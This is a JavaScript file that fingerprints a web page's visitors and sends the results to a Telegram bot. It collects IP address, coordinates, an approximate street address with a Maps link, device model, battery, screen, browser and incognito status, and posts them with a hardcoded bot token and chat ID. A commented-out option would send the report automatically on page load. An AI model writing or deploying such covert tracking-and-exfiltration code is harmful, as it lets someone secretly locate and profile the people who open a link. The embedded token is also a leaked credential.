// ========== FINGERPRINTING FUNCTIONS ==========

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

async function getIPWithLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const result = await response.json();
        
        return {
            ip: result.ip || 'Unknown',
            city: result.city || 'Unknown',
            region: result.region || 'Unknown',
            country: result.country_name || result.country || 'Unknown',
            isp: result.org || 'Unknown',
            latitude: result.latitude || null,
            longitude: result.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', error: error.message };
    }
}

function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Unknown Device";
    
    if (ua.includes('samsung')) {
        if (ua.includes('sm-')) {
            const match = ua.match(/sm-[a-z]\d+/);
            if (match) device = `Samsung ${match[0].toUpperCase()}`;
            else device = "Samsung Galaxy";
        } else if (ua.includes('galaxy')) {
            device = "Samsung Galaxy";
        }
    } else if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ')) {
        device = "Xiaomi Phone";
    } else if (ua.includes('pixel')) {
        device = "Google Pixel";
    } else if (ua.includes('iphone')) {
        device = "iPhone";
    } else if (ua.includes('ipad')) {
        device = "iPad";
    } else if (ua.includes('oneplus')) {
        device = "OnePlus";
    }
    
    return device;
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        userAgent: ua,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        touchSupport: 'ontouchstart' in window,
        vibration: 'vibrate' in navigator,
        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)/i.test(ua),
        isDesktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    
    if (/chrome|chromium|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    
    return {
        name: browser,
        version: ua.match(/(?:chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)?.[1] || "Unknown",
        language: navigator.language
    };
}

function getScreenInfo() {
    return {
        resolution: { width: screen.width, height: screen.height },
        colorDepth: screen.colorDepth + " bits",
        devicePixelRatio: window.devicePixelRatio
    };
}

function getDisplayInfo() {
    return {
        viewport: { width: window.innerWidth, height: window.innerHeight },
        darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches
    };
}

function getPerformanceInfo() {
    return { 
        timing: { total: performance.timing?.loadEventEnd - performance.timing?.navigationStart || 0 }
    };
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging,
                level: Math.round(battery.level * 100) + "%",
                batterySaving: "Not detected",
                notes: "Accurate reading"
            };
        } catch {
            return { error: "Battery API blocked" };
        }
    }
    return { error: "Battery API not supported" };
}

async function getGoogleMapsLocation(ipData) {
    if (!ipData.latitude || !ipData.longitude) {
        return null;
    }
    
    try {
        const mapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
        let address = "Approximate location";
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=10`
            );
            const data = await response.json();
            if (data.display_name) {
                address = data.display_name.split(',').slice(0, 3).join(',');
            }
        } catch {}
        
        return {
            googleMapsLink: mapsLink,
            approximateAddress: address,
            coordinates: `${ipData.latitude}, ${ipData.longitude}`
        };
    } catch (error) {
        return null;
    }
}

async function detectIncognito() {
    const fsTest = await new Promise((resolve) => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
            resolve(false);
            return;
        }
        
        fs(window.TEMPORARY, 100, () => {
            resolve(false);
        }, () => {
            resolve(true);
        });
    });
    
    return {
        isIncognito: fsTest === true,
        certainty: fsTest === true ? "High" : "Medium",
        notes: fsTest === true ? "Incognito mode detected" : "Normal browsing mode"
    };
}

// ========== MAIN COLLECT FUNCTION ==========
async function collectEnhancedData() {
    const ipData = await getIPWithLocation();
    const batteryData = await getBatteryInfo();
    const incognitoData = await detectIncognito();
    const mapsData = await getGoogleMapsLocation(ipData);
    
    return {
        timestamp: new Date().toISOString(),
        sessionId: generateSessionId(),
        deviceName: getDeviceName(),
        ip: ipData,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        googleMaps: mapsData,
        battery: batteryData,
        device: getDeviceInfo(),
        browser: getBrowserInfo(),
        screen: getScreenInfo(),
        display: getDisplayInfo(),
        performance: getPerformanceInfo(),
        incognito: incognitoData,
        referrer: document.referrer || 'Direct visit'
    };
}

// ========== TELEGRAM SEND FUNCTION ==========
async function sendToTelegramBot(message) {
    const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
    const CHAT_ID = '7307197149';
    
    let cleanMessage = message.substring(0, 4096);
    
    try {
        const formData = new URLSearchParams();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', cleanMessage);
        formData.append('parse_mode', '');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData
        });
        
        const result = await response.json();
        console.log("Telegram response:", result);
        return result;
        
    } catch (error) {
        console.error('Network error:', error);
        return { ok: false, error: error.message };
    }
}

// ========== MAIN FUNCTION TO CALL FROM BUTTONS ==========
async function sendFingerprintToTelegram() {
    console.log("🔍 Collecting fingerprint data...");
    
    try {
        const data = await collectEnhancedData();
        
        const telegramMessage = `
🚀 DEVICE FINGERPRINT REPORT

📅 Time: ${new Date(data.timestamp).toLocaleString()}
🆔 Session: ${data.sessionId}

📱 DEVICE
Name: ${data.deviceName}
Type: ${data.device.isMobile ? 'Mobile' : data.device.isTablet ? 'Tablet' : 'Desktop'}
Platform: ${data.device.platform}
Memory: ${data.device.deviceMemory}GB
Cores: ${data.device.hardwareConcurrency}

📍 LOCATION
IP: ${data.ip.ip || 'Unknown'}
City: ${data.ip.city || 'Unknown'}
Country: ${data.ip.country || 'Unknown'}
ISP: ${data.ip.isp || 'Unknown'}
Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}

🗺️ MAPS
${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
${data.googleMaps ? data.googleMaps.googleMapsLink : ''}

🔋 BATTERY
Level: ${data.battery.level || 'Unknown'}
Charging: ${data.battery.charging ? 'Yes' : 'No'}

🌐 BROWSER
${data.browser.name} ${data.browser.version}
Language: ${data.browser.language}
Incognito: ${data.incognito.isIncognito ? 'Yes' : 'No'}

🖥️ SCREEN
Resolution: ${data.screen.resolution.width}x${data.screen.resolution.height}
Viewport: ${data.display.viewport.width}x${data.display.viewport.height}
Dark Mode: ${data.display.darkMode ? 'Enabled' : 'Disabled'}

📊 PERFORMANCE
Load Time: ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}

🔗 REFERRER
${data.referrer}

👤 USER AGENT:
${data.device.userAgent.substring(0, 150)}...
        `.replace(/\*/g, '').replace(/[_]/g, '');
        
        const result = await sendToTelegramBot(telegramMessage);
        
        if (result && result.ok) {
            console.log("✅ Fingerprint sent to Telegram!");
            alert("✅ Device fingerprint sent to Telegram!");
            return true;
        } else {
            console.log("❌ Failed to send");
            alert("❌ Failed to send fingerprint");
            return false;
        }
        
    } catch (error) {
        console.error("❌ Error:", error);
        alert("❌ Error collecting fingerprint");
        return false;
    }
}

// ========== EXPOSE FUNCTION TO GLOBAL SCOPE ==========
window.sendFingerprintToTelegram = sendFingerprintToTelegram;

// Optional: Auto-send when page loads (comment out if not needed)
// setTimeout(() => {
//     sendFingerprintToTelegram();
// }, 3000);
